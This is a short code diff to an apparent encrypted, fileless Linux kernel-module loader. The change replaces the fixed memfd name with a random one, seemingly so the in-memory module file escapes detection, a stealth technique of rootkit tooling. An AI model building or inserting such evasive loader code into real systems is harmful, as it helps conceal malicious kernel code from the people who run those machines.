@@ -1,5 +1,6 @@
 #include "../include/load.h"
 #include "../include/cipher.h"
+#include "../include/utils.h"
 #define _GNU_SOURCE
 #include <linux/memfd.h>
 #include <linux/module.h>
@@ -54,8 +55,15 @@ uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len, u
 int load_lkm(const uint8_t *lkm, ssize_t total_size) {
   int fdlkm;
   ssize_t written_bytes;
+  char *filename;
+
+  filename = generate_random_string();
+
+  log_debug("Using random filename %s", filename);
   
-  fdlkm = syscall(SYS_memfd_create, "lkmmod", 0);
+  fdlkm = syscall(SYS_memfd_create, filename, 0);
+
+  free(filename);
   
   if (fdlkm < 0) {
     log_error("memfd_create failed");
